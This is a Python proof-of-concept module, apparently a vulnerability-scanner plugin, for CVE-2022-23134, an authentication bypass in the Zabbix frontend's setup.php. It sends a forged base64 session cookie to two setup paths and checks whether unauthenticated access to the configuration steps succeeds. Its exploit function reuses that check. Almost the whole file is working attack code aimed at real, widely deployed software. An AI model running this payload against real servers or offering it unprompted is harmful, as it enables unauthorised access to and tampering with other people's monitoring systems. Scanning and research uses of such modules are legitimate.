import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Zabbix Setup Configuration Authentication Bypass''',
        "description": '''After the initial setup process, some steps of setup.php file are reachable not only by super-administrators but also by unauthenticated users. A malicious actor can pass step checks and potentially change the configuration of Zabbix Frontend.''',
        "severity": "medium",
        "references": [
            "https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23134"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvss-score": "5.3",
            "cve-id": "CVE-2022-23134",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2022", "zabbix", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        paths = [
            "/zabbix/setup.php",
            "/setup.php"
        ]
        headers = {
            "Cookie": "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
        }

        for path in paths:
            resp = requests.get(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
            if resp.status_code == 200 and "Database" in resp.text and "host" in resp.text and "port" in resp.text and "Zabbix" in resp.text:
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url